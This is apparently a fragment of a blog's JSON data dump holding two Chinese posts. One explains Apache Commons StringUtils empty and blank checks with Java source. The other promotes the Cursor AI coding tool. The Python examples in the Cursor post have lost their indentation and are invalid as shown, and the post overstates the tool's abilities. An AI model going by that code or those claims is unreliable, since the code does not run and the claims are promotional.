title=\"StringUtils.isAnyEmpty()\"></a>StringUtils.isAnyEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否有一个为空,<code>只有一个为空,就为true</code>.</p>\n<ul>\n<li><p>StringUtils.isAnyEmpty(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(null, “foo”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“”, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“bob”, “”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“ bob “, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“ “, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“foo”, “bar”) &#x3D; false</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/1.png\"></p>\n<h2 id=\"StringUtils-isNoneEmpty\"><a href=\"#StringUtils-isNoneEmpty\" class=\"headerlink\" title=\"StringUtils.isNoneEmpty()\"></a>StringUtils.isNoneEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于<code>!isAnyEmpty(css)</code> , 必须所有的值都不为空才返回true</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect\"></a>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。<a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect\"></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\"> * &lt;p&gt;Checks if none of the CharSequences are empty (&quot;&quot;) or null.&lt;/p&gt;  </span><br><span class=\"line\"> *  </span><br><span class=\"line\"> * &lt;pre&gt;  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(null)             = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(null, &quot;foo&quot;)      = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;&quot;, &quot;bar&quot;)        = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;bob&quot;, &quot;&quot;)        = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;  bob  &quot;, null)  = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot; &quot;, &quot;bar&quot;)       = true  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;foo&quot;, &quot;bar&quot;)     = true  </span><br><span class=\"line\"> * &lt;/pre&gt;  </span><br><span class=\"line\"> *  </span><br><span class=\"line\"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class=\"line\"> * @return &#123;@code true&#125; if none of the CharSequences are empty or null  </span><br><span class=\"line\"> * @since 3.2  </span><br><span class=\"line\"> */  </span><br><span class=\"line\">public static boolean isNoneEmpty(final CharSequence... css) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  return !isAnyEmpty(css);  </span><br><span class=\"line\">&#125;    </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"isBank系列\"><a href=\"#isBank系列\" class=\"headerlink\" title=\"isBank系列\"></a>isBank系列</h1><h2 id=\"StringUtils-isBlank\"><a href=\"#StringUtils-isBlank\" class=\"headerlink\" title=\"StringUtils.isBlank()\"></a>StringUtils.isBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否为真空值(空格或者空值)</code></p>\n<ul>\n<li><p>StringUtils.isBlank(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“ “) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“bob”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isBlank(“ bob “) &#x3D; false</p>\n</li>\n</ul>\n<h2 id=\"StringUtils-isNotBlank\"><a href=\"#StringUtils-isNotBlank\" class=\"headerlink\" title=\"StringUtils.isNotBlank()\"></a><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/2.png\"><br>StringUtils.isNotBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否真的不为空</code>,不是空格或者空值 ,相当于<code>!isBlank();</code></p>\n<h2 id=\"StringUtils-isAnyBlank\"><a href=\"#StringUtils-isAnyBlank\" class=\"headerlink\" title=\"StringUtils.isAnyBlank()\"></a><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/3.png\"><br>StringUtils.isAnyBlank()</h2><p><code>&gt;&gt;&gt;</code>是否包含任何真空值<code>(包含空格或空值)</code></p>\n<ul>\n<li><p>StringUtils.isAnyBlank(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(null, “foo”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(null, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“”, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“bob”, “”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“ bob “, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“ “, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“foo”, “bar”) &#x3D; false</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> /**  </span><br><span class=\"line\"> * &lt;p&gt;Checks if any one of the CharSequences are blank (&quot;&quot;) or null and not whitespace only..&lt;/p&gt;  </span><br><span class=\"line\"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class=\"line\"> * @return &#123;@code true&#125; if any of the CharSequences are blank or null or whitespace only  </span><br><span class=\"line\"> * @since 3.2  </span><br><span class=\"line\"> */  </span><br><span class=\"line\">public static boolean isAnyBlank(final CharSequence... css) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  if (ArrayUtils.isEmpty(css)) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    return true;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  for (final CharSequence cs : css)&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    if (isBlank(cs)) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">      return true;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  return false;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isNoneBlank\"><a href=\"#StringUtils-isNoneBlank\" class=\"headerlink\" title=\"StringUtils.isNoneBlank()\"></a>StringUtils.isNoneBlank()</h2><p><code>&gt;&gt;&gt;</code>是否全部都不包含空值或空格</p>\n<ul>\n<li><p>StringUtils.isNoneBlank(null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(null, “foo”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(null, null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“”, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“bob”, “”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“ bob “, null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“ “, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“foo”, “bar”) &#x3D; true</p>\n</li>\n</ul>\n<pre><code>/**  \n * &lt;p&gt;Checks if none of the CharSequences are blank (&quot;&quot;) or null and whitespace only..&lt;/p&gt;  \n * @param css  the CharSequences to check, may be null or empty  \n * @return &#123;@code true&#125; if none of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isNoneBlank(final CharSequence... css) &#123;  \n  \n  \n  return !isAnyBlank(css);  \n&#125;  \n  \n</code></pre>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<p>也许你两个都不知道,也许你除了isEmpty&#x2F;isNotEmpty&#x2F;isNotBlank&#x2F;isBlank外,并不知道还有<code>isAnyEmpty/isNoneEmpty/isAnyBlank/isNoneBlank</code>的存在, come on ,让我们一起来探索<code>org.apache.commons.lang3.StringUtils;</code>这个工具类.</p>\n<h1 id=\"isEmpty系列\"><a href=\"#isEmpty系列\" class=\"headerlink\" title=\"isEmpty系列\"></a>isEmpty系列</h1><h2 id=\"StringUtils-isEmpty\"><a href=\"#StringUtils-isEmpty\" class=\"headerlink\" title=\"StringUtils.isEmpty()\"></a>StringUtils.isEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否为空. 可以看到 <code>&quot; &quot;</code> 空格是会绕过这种空判断,因为是一个<code>空格</code>,并不是严格的<code>空值</code>,会导致 <code>isEmpty(&quot; &quot;)=false</code></p>\n<ul>\n<li><p>StringUtils.isEmpty(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isEmpty(“”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isEmpty(“ “) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isEmpty(“bob”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isEmpty(“ bob “) &#x3D; false</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\">  *  </span><br><span class=\"line\">  * &lt;p&gt;NOTE: This method changed in Lang version 2.0.  </span><br><span class=\"line\">  * It no longer trims the CharSequence.  </span><br><span class=\"line\">  * That functionality is available in isBlank().&lt;/p&gt;  </span><br><span class=\"line\">  *  </span><br><span class=\"line\">  * @param cs  the CharSequence to check, may be null  </span><br><span class=\"line\">  * @return &#123;@code true&#125; if the CharSequence is empty or null  </span><br><span class=\"line\">  * @since 3.0 Changed signature from isEmpty(String) to isEmpty(CharSequence)  </span><br><span class=\"line\">*/  </span><br><span class=\"line\">public static boolean isEmpty(final CharSequence cs) &#123;  </span><br><span class=\"line\">   return cs == null || cs.length() == 0;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isNotEmpty\"><a href=\"#StringUtils-isNotEmpty\" class=\"headerlink\" title=\"StringUtils.isNotEmpty()\"></a>StringUtils.isNotEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于不为空 , &#x3D; <code>!isEmpty()</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public static boolean isNotEmpty(final CharSequence cs) &#123;  </span><br><span class=\"line\">    return !isEmpty(cs);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isAnyEmpty\"><a href=\"#StringUtils-isAnyEmpty\" class=\"headerlink\" title=\"StringUtils.isAnyEmpty()\"></a>StringUtils.isAnyEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否有一个为空,<code>只有一个为空,就为true</code>.</p>\n<ul>\n<li><p>StringUtils.isAnyEmpty(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(null, “foo”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“”, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“bob”, “”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“ bob “, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“ “, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isAnyEmpty(“foo”, “bar”) &#x3D; false</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/1.png\"></p>\n<h2 id=\"StringUtils-isNoneEmpty\"><a href=\"#StringUtils-isNoneEmpty\" class=\"headerlink\" title=\"StringUtils.isNoneEmpty()\"></a>StringUtils.isNoneEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于<code>!isAnyEmpty(css)</code> , 必须所有的值都不为空才返回true</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect\"></a>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。<a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect\"></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/**  </span><br><span class=\"line\"> * &lt;p&gt;Checks if none of the CharSequences are empty (&quot;&quot;) or null.&lt;/p&gt;  </span><br><span class=\"line\"> *  </span><br><span class=\"line\"> * &lt;pre&gt;  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(null)             = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(null, &quot;foo&quot;)      = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;&quot;, &quot;bar&quot;)        = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;bob&quot;, &quot;&quot;)        = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;  bob  &quot;, null)  = false  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot; &quot;, &quot;bar&quot;)       = true  </span><br><span class=\"line\"> * StringUtils.isNoneEmpty(&quot;foo&quot;, &quot;bar&quot;)     = true  </span><br><span class=\"line\"> * &lt;/pre&gt;  </span><br><span class=\"line\"> *  </span><br><span class=\"line\"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class=\"line\"> * @return &#123;@code true&#125; if none of the CharSequences are empty or null  </span><br><span class=\"line\"> * @since 3.2  </span><br><span class=\"line\"> */  </span><br><span class=\"line\">public static boolean isNoneEmpty(final CharSequence... css) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  return !isAnyEmpty(css);  </span><br><span class=\"line\">&#125;    </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"isBank系列\"><a href=\"#isBank系列\" class=\"headerlink\" title=\"isBank系列\"></a>isBank系列</h1><h2 id=\"StringUtils-isBlank\"><a href=\"#StringUtils-isBlank\" class=\"headerlink\" title=\"StringUtils.isBlank()\"></a>StringUtils.isBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否为真空值(空格或者空值)</code></p>\n<ul>\n<li><p>StringUtils.isBlank(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“ “) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isBlank(“bob”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isBlank(“ bob “) &#x3D; false</p>\n</li>\n</ul>\n<h2 id=\"StringUtils-isNotBlank\"><a href=\"#StringUtils-isNotBlank\" class=\"headerlink\" title=\"StringUtils.isNotBlank()\"></a><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/2.png\"><br>StringUtils.isNotBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否真的不为空</code>,不是空格或者空值 ,相当于<code>!isBlank();</code></p>\n<h2 id=\"StringUtils-isAnyBlank\"><a href=\"#StringUtils-isAnyBlank\" class=\"headerlink\" title=\"StringUtils.isAnyBlank()\"></a><img src=\"/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/3.png\"><br>StringUtils.isAnyBlank()</h2><p><code>&gt;&gt;&gt;</code>是否包含任何真空值<code>(包含空格或空值)</code></p>\n<ul>\n<li><p>StringUtils.isAnyBlank(null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(null, “foo”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(null, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“”, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“bob”, “”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“ bob “, null) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“ “, “bar”) &#x3D; true</p>\n</li>\n<li><p>StringUtils.isAnyBlank(“foo”, “bar”) &#x3D; false</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> /**  </span><br><span class=\"line\"> * &lt;p&gt;Checks if any one of the CharSequences are blank (&quot;&quot;) or null and not whitespace only..&lt;/p&gt;  </span><br><span class=\"line\"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class=\"line\"> * @return &#123;@code true&#125; if any of the CharSequences are blank or null or whitespace only  </span><br><span class=\"line\"> * @since 3.2  </span><br><span class=\"line\"> */  </span><br><span class=\"line\">public static boolean isAnyBlank(final CharSequence... css) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  if (ArrayUtils.isEmpty(css)) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    return true;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  for (final CharSequence cs : css)&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    if (isBlank(cs)) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">      return true;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">  return false;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"StringUtils-isNoneBlank\"><a href=\"#StringUtils-isNoneBlank\" class=\"headerlink\" title=\"StringUtils.isNoneBlank()\"></a>StringUtils.isNoneBlank()</h2><p><code>&gt;&gt;&gt;</code>是否全部都不包含空值或空格</p>\n<ul>\n<li><p>StringUtils.isNoneBlank(null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(null, “foo”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(null, null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“”, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“bob”, “”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“ bob “, null) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“ “, “bar”) &#x3D; false</p>\n</li>\n<li><p>StringUtils.isNoneBlank(“foo”, “bar”) &#x3D; true</p>\n</li>\n</ul>\n<pre><code>/**  \n * &lt;p&gt;Checks if none of the CharSequences are blank (&quot;&quot;) or null and whitespace only..&lt;/p&gt;  \n * @param css  the CharSequences to check, may be null or empty  \n * @return &#123;@code true&#125; if none of the CharSequences are blank or null or whitespace only  \n * @since 3.2  \n */  \npublic static boolean isNoneBlank(final CharSequence... css) &#123;  \n  \n  \n  return !isAnyBlank(css);  \n&#125;  \n  \n</code></pre>\n"},{"title":"写代码神器","date":"2024-05-26T04:45:07.000Z","_content":"\nCursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。\n\n![首页](./2024/05/26/写代码神器/1.png)\n\nCursor的用途和优势\n\nCursor可以应用于多种编程场景和语言，无论你是一个新手还是一个专家，Cursor都可以为你提供强大的编程支持。Cursor的主要用途和优势有：\n\n代码生成：Cursor可以根据你的自然语言描述或者部分代码，生成完整的代码片段或者函数。你可以使用Cursor来快速实现你的编程想法，或者填补你的代码空缺。Cursor支持多种编程语言，如Python, Java, C++, JavaScript等，你可以根据你的需要选择合适的语言。\n\n代码修改：Cursor可以根据你的修改意图和需求，对你的代码进行修改和优化。你可以使用Cursor来修改你的代码逻辑、参数、变量名等，或者对你的代码进行重构、简化和美化。Cursor可以保证修改后的代码的正确性和一致性，避免引入新的错误。\n\n代码测试：Cursor可以根据你的代码，生成相应的测试用例和测试代码。你可以使用Cursor来测试你的代码的功能、性能、安全性等，或者对你的代码进行覆盖率、静态分析等检查。Cursor可以帮助你提高你的代码的可靠性和稳定性，发现和解决潜在的问题。\n\n代码文档：Cursor可以根据你的代码，生成相应的文档和注释。你可以使用Cursor来生成你的代码的说明、用法、参数、返回值等，或者对你的代码添加有意义的注释。Cursor可以帮助你提高你的代码的可读性和可维护性，方便你和他人理解和使用你的代码。\n\n![编辑页](./2024/05/26/写代码神器/2.png)\n\nCursor的使用方法\n\nCursor的使用方法非常简单和方便，你只需要在你的编程环境中安装Cursor的插件，然后就可以通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。Cursor的使用方法如下：\n\n代码生成：你可以在你的代码编辑器中输入你的自然语言描述或者部分代码，然后按下Ctrl+Enter键，Cursor就会为你生成相应的代码。例如，你可以输入“定义一个Python函数，计算两个数的最大公约数”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\ndef gcd(a, b):\n# 使用辗转相除法计算两个数的最大公约数\nwhile b != 0:\na, b = b, a % b\nreturn a\n代码修改：你可以在你的代码编辑器中选中你想要修改的代码，然后输入你的修改意图或者需求，然后按下Ctrl+Enter键，Cursor就会为你修改相应的代码。例如，你可以选中上面的代码，然后输入“使用递归的方式实现”，然后按下Ctrl+Enter键，Cursor就会为你修改如下的代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\ndef gcd(a, b):\n# 使用递归的方式计算两个数的最大公约数\nif b == 0:\nreturn a\nelse:\nreturn gcd(b, a % b)\n代码测试：你可以在你的代码编辑器中选中你想要测试的代码，然后输入你的测试目标或者条件，然后按下Ctrl+Enter键，Cursor就会为你生成相应的测试用例和测试代码。例如，你可以选中上面的代码，然后输入“测试函数的正确性和性能”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的测试用例和测试代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\nimport unittest\nimport timeit\n\nclass TestGcd(unittest.TestCase):\n# 测试gcd函数的正确性和性能\n\ndef test_correctness(self):\n# 测试gcd函数的正确性\nself.assertEqual(gcd(12, 18), 6)\nself.assertEqual(gcd(24, 36), 12)\nself.assertEqual(gcd(17, 23), 1)\n\ndef test_performance(self):\n# 测试gcd函数的性能\nt = timeit.timeit(\"gcd(123456789, 987654321)\", setup=\"from __main__ import gcd\", number=1000)\nprint(f\"Average time for 1000 calls: {t/1000:.6f} seconds\")\n\nif __name__ == \"__main__\":\nunittest.main()\n代码文档：你可以在你的代码编辑器中选中你想要文档化的代码，然后输入你的文档目的或者格式，然后按下Ctrl+Enter键，Cursor就会为你生成相应的文档和注释。例如，你可以选中上面的代码，然后输入“生成Markdown格式的文档”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的文档和注释：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\n# gcd函数\n\n## 功能\n\ngcd函数用于计算两个数的最大公约数。\n\n## 参数\n\n- a: 第一个数，必须是整数。\n- b: 第二个数，必须是整数。\n\n## 返回值\n\n返回两个数的最大公约数，是一个整数。\n\n## 示例\n\n```python\n>>> gcd(12, 18)\n6\n>>> gcd(24, 36)\n12\n>>> gcd(17, 23)\n1\n\n```\ngcd函数使用了递归的方式实现，如果两个数较大，可能会导致栈溢出的风险。可以考虑使用循环的方式改进。\n\n\n\nCursor的优势和特点\n\nCursor的优势和特点有：\n\n- 基于人工智能：Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。\n- 基于文本：Cursor使用了基于文本的交互方式，你只需要通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。你不需要学习任何复杂的语法或者命令，只需要用你熟悉的语言来表达你的编程想法和需求，Cursor就可以为你完成你的编程任务。\n- 基于插件：Cursor使用了基于插件的集成方式，你只需要在你的编程环境中安装Cursor的插件，然后就可以在你的代码编辑器中直接使用Cursor的功能。你不需要切换到任何其他的平台或者工具，只需要在你的代码编辑器中按下Ctrl+Enter键，Cursor就可以为你生成、修改、测试或者文档化你的代码。\n\n![搜索页](./2024/05/26/写代码神器/2.png)\n\n\n\nCursor的未来展望\n\nCursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言\n","source":"_posts/写代码神器.md","raw":"---\ntitle: 写代码神器\ndate: 2024-05-26 12:45:07\ntags: 开发神器\ncategories: 工具\n---\n\nCursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。\n\n![首页](./2024/05/26/写代码神器/1.png)\n\nCursor的用途和优势\n\nCursor可以应用于多种编程场景和语言，无论你是一个新手还是一个专家，Cursor都可以为你提供强大的编程支持。Cursor的主要用途和优势有：\n\n代码生成：Cursor可以根据你的自然语言描述或者部分代码，生成完整的代码片段或者函数。你可以使用Cursor来快速实现你的编程想法，或者填补你的代码空缺。Cursor支持多种编程语言，如Python, Java, C++, JavaScript等，你可以根据你的需要选择合适的语言。\n\n代码修改：Cursor可以根据你的修改意图和需求，对你的代码进行修改和优化。你可以使用Cursor来修改你的代码逻辑、参数、变量名等，或者对你的代码进行重构、简化和美化。Cursor可以保证修改后的代码的正确性和一致性，避免引入新的错误。\n\n代码测试：Cursor可以根据你的代码，生成相应的测试用例和测试代码。你可以使用Cursor来测试你的代码的功能、性能、安全性等，或者对你的代码进行覆盖率、静态分析等检查。Cursor可以帮助你提高你的代码的可靠性和稳定性，发现和解决潜在的问题。\n\n代码文档：Cursor可以根据你的代码，生成相应的文档和注释。你可以使用Cursor来生成你的代码的说明、用法、参数、返回值等，或者对你的代码添加有意义的注释。Cursor可以帮助你提高你的代码的可读性和可维护性，方便你和他人理解和使用你的代码。\n\n![编辑页](./2024/05/26/写代码神器/2.png)\n\nCursor的使用方法\n\nCursor的使用方法非常简单和方便，你只需要在你的编程环境中安装Cursor的插件，然后就可以通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。Cursor的使用方法如下：\n\n代码生成：你可以在你的代码编辑器中输入你的自然语言描述或者部分代码，然后按下Ctrl+Enter键，Cursor就会为你生成相应的代码。例如，你可以输入“定义一个Python函数，计算两个数的最大公约数”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\ndef gcd(a, b):\n# 使用辗转相除法计算两个数的最大公约数\nwhile b != 0:\na, b = b, a % b\nreturn a\n代码修改：你可以在你的代码编辑器中选中你想要修改的代码，然后输入你的修改意图或者需求，然后按下Ctrl+Enter键，Cursor就会为你修改相应的代码。例如，你可以选中上面的代码，然后输入“使用递归的方式实现”，然后按下Ctrl+Enter键，Cursor就会为你修改如下的代码：\n\n\nPython\nAI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.\n\n\ndef gcd(a, b):\n# 使用递归的方式计算两个数的最大公约数\nif b == 0:\nreturn 